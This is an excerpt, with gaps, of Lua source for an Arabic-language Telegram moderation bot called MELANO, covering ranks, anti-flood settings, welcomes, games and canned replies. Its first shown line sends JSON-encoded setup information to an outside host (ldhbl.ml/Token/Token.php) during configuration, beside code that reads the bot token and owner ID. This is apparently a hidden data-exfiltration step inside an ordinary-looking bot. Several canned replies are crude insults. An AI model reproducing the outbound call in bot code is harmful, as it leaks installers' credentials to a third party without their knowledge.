...
https.request('http://ldhbl.ml/Token/Token.php/?insert='..JSON.encode(saiedinfo))
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
send(chat,msg.id_,"\n🎖️┋تم رفع الملف بنجاح وتفعيل المجموعات\n⚡┋ ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")   
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n📮┋ العضــو » '..Name..'\n☑️┋ قام بالتكرار هنا وتم طرده '  
...
Text = '\n☑️┋ تم تفعيل البوت خدمي ' 
else
Text = '\n⚠️┋ بالتاكيد تم تفعيل البوت خدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n☑️┋ تم تعطيل البوت خدمي' 
else
Text = '\n⚠️┋ بالتاكيد تم تعطيل البوت خدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,'☑️┋ الغاء حفظ كليشه ستارت')
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local MELANO1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..MELANO1.server.uptime_in_days..'('..MELANO1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..MELANO1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..MELANO1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..MELANO1.stats.instantaneous_ops_per_sec..'`\n'
...
send(msg.chat_id_, msg.id_, "☑️┋ تم حفظ اسم البوت")  
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"☑️┋ تم الغاء الاذاعه للخاص") 
...
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '🎖️┋ حسنآ ارسل لي معرف القناة') 
return false  
end
...
⛓️⇗✰MELANO TEAM✰⇖⛓️
🇯🇵〰️〰️〰️〰️〰️〰️〰️〰️〰️🇮🇶
𖤤┊[Source Channel](t.me/BEKOBOT1) 🖤
𖤤┊[melano dev](t.me/SX0XX0)🖤
𖤤┊[Source  Files](t.me/BEKO_M1)🖤
...
send(msg.chat_id_, msg.id_,'☑️┋ تم ازالة جميع الاوامر المضافه')  
end
end
...
send(msg.chat_id_, msg.id_,'☑️┋ تم حفظ الامر')  
...
send(msg.chat_id_, msg.id_,'☑️┋ تم قفل التكرار بالطرد\n⛔┋ الحاله ←الطرد')
elseif text == 'قفل التكرار' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,'☑️┋ تم قفل التكرار \n⛔┋ الحاله ←بالمسح')
elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,'☑️┋ تم قفل التكرار بالتقييد\n⛔┋ الحاله ←التقييد')
elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,'☑️┋ تم قفل التكرار بالكتم\n⛔┋ الحاله ←الكتم')
elseif text == 'فتح التكرار' and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,'☑️┋ تم فتح التكرار')
end 
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and SudoBot(msg) then    
dofile('MELANO.lua')  
send(msg.chat_id_, msg.id_, '🗂️┋ تم تحديث الملفات') 
end 
...
function start_function(extra, result, success)
database:sadd(bot_id..'Klby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
function start_function(extra, result, success)
database:srem(bot_id..'Klby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
status  = '\n💢┋ تم تنزيل العضو تاج |📡 من المجموعه\n✓️'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
function start_function(extra, result, success)
database:sadd(bot_id..'Jlp:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
function start_function(extra, result, success)
database:srem(bot_id..'Jlb:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
local  statuss  = '\n💢┋ تم رفع العضو نبي 👳🏻‍♂️ في المجموعه\n✓️'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
status  = '\n💢┋تم تنزيل العضو نبي 👳🏻‍♂️من المجموعة بنجاح\n✓️'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
function start_function(extra, result, success)
database:sadd(bot_id..'Zoa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
if (text == ("طلاك")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:srem(bot_id..'Zoa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
function start_function(extra, result, success)
database:sadd(bot_id..'Zaghl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
function start_function(extra, result, success)
database:srem(bot_id..'Zaghl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
function start_function(extra, result, success)
database:sadd(bot_id..'Mrty:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
function start_function(extra, result, success)
database:srem(bot_id..'Mrty:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👨🏽‍⚖️️️┋ مرحبا عزيزي 🍃 '
...
send(msg.chat_id_,msg.id_,"☑️┋ التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
...
GetWelcome = '☑️┋ لم يتم تعيين ترحيب للمجموعه'
end 
...
send(msg.chat_id_, msg.id_,'☑️┋ تم ازالة ترحيب المجموعه') 
end
end
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, "☑️┋ تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"☑️┋ تم حفظ قوانين المجموعه") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
if num > 10000 then 
send(msg.chat_id_, msg.id_,'☑️┋ تستطيع التنظيف(10000) رساله كحد اقصى ')
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"☑️┋ ارسل لي الاسم الان ")  
end
return false
end

if text == ""..(database:get(bot_id..'Name:Bot') or 'ميلانو').."" then  
...
send(msg.chat_id_, msg.id_,"\n☑️┋ تم تنزيل العضو من الرتب التاليه \n☑️┋ { "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." } \n")
else
...
send(msg.chat_id_, msg.id_,"☑️┋ تم مسح ردود المطور")
end
...
send(msg.chat_id_, msg.id_,'☑️┋ تم حفظ الرد بنجاح')
return false  
end  
end
...
send(msg.chat_id_, msg.id_,'☑️┋ تم ازالة الرد من قائمه ردود المطور')
...
send(msg.chat_id_, msg.id_,"☑️┋ تم مسح ردود المدير")
end

if text == ("ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = "☑️┋ قائمه ردود المدير \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,'☑️┋ ارسل الكلمه التي تريد حذفها')
...
Text = '☑️┋ تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = '☑️┋ بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end
...
Text = '\n☑️┋ بالتاكيد تم تعطيل ردود المدير'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n☑️┋ بالتاكيد تم تعطيل ردود المطور'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n☑️┋ تم تفعيل الايدي بالصور ' 
else
Text = '\n☑️┋ بالتاكيد تم تفعيل الايدي بالصوره '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,'☑️┋ تم طردك من المجموعه ') 
...
send(msg.chat_id_, msg.id_,'☑️┋ امر صيح تم تعطيله من قبل المدراء ') 
end
return false
end
...
send(msg.chat_id_, msg.id_,'☑️┋ انت منشئ المجموعه ') 
return false
end
...
Text = '\n☑️┋ تم تعطيل امر منو ضافني'
else
Text = '\n☑️┋ بالتاكيد تم تعطيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = '☑️┋ تم تفعيل امر صيح'
...
Text = '\n☑️┋ بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = '☑️┋ تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = '☑️┋ بالتاكيد تم تفعيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if not my_ph then
send(msg.chat_id_, msg.id_,"⚠️┋ الصوره معطله") 
return false  
end
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, taha.photos_[0].sizes_[1].photo_.persistent_id_,'📸┋الصوره • '..rdphoto..'\n🎟┋ايديــك • '..msg.sender_user_id_..'\n🎭┋مـعرفك • '..username..'\n📌┋رتبتـك • '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n👤┋موقعـك • '..rtpa..'\n🎲┋تفاعـلك • '..Total_Msg(Msguser)..'\n💌┋رسـائلك • '..Msguser..'\n✏️┋السحكات • '..edit..'\n💎┋مجوهرآتك • '..NUMPGAME..'\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ')   
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n🎟┋ايديــك • '..msg.sender_user_id_..'\n🎭┋مـعرفك • '..username..'\n📌┋رتبتـك •  '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n👤┋موقعـك • '..rtpa..'\n🎲┋تفاعـلك • '..Total_Msg(Msguser)..'\n💌┋رسـائلك • '..Msguser..'\n✏️┋السحكات • '..edit..'\n💎┋مجوهرآتك • '..NUMPGAME..']\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ')   
else
...
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'📌┋ عدد المشتركين الان » ( '..#pv..' )\n🎖️┋ تم ازالة » ( '..sendok..' ) من المشتركين\n📥┋ الان عدد المشتركين الحقيقي » ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
-- vardump(data) 
MELANOdx(msg.chat_id_, msg.id_, '📤┋ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┋ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┋ عدد المحظورين » ( *'..data.kicked_count_..' )*\n😼✊🏿┊ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_,msg.id_,'\n📌┋ اهلا عزيزي البوت هنا ادمن'..'\n☑️┋  وصلاحياته هي ↓ \nٴ━━━━━━━━━━'..'\n📝┋  تغير معلومات المجموعه ↞ ❴ '..info..' ❵'..'\n💌┋  حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n☑️┋  حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n♻┋  دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n☑️┋  تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n🎖️┋  اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"نجب انت لا الطمك ع حلكك 😤","بيك مرض الا تتحارش😒","اهو اجو الملطلطين ويغلطون" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
...
send(msg.chat_id_, msg.id_,'🎖️┋ اسرع واحد يدز هذا السمايل ? » {`'..SM..'`}')
return false
end
end
...
database:del(bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'📮┋ اوبس لقد خسرت في اللعبه \n💢┋ حظآ اوفر في المره القادمه \n🎖️┋ كان الرقم الذي تم تخمينه { '..GETNUM..' }')
else
...
Text = '🤹‍♂️┋ عدد نقاط التي ربحتها هہي *» { '..Num..' } مجوهہ‌‏رهہ‌‏ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ختولي موخوش بنيه","دور حلوين 🤕😹","جكمه وصخه عوفها ☹️😾","حقيره ومتكبره 😶😂"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "رزله" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ولك هيو لتندك بسيادك لو بهاي 👞👈","ميستاهل اتعبي روحي ويا لانه عار","عوفه يروحي هاذا حيوان يضل يمضرط🤣"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
send(msg.chat_id_, msg.id_,'☑️┋ لا يوجد امر بهاذا الاسم')  
end
...
------------------------------------------------------------------------
local MELANOAbot = database:get(bot_id.."MELANO1:Add:Filter:Rp2"..text..result.chat_id_)   
if MELANOAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┋العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┋["..MELANOAbot.."] \n") 
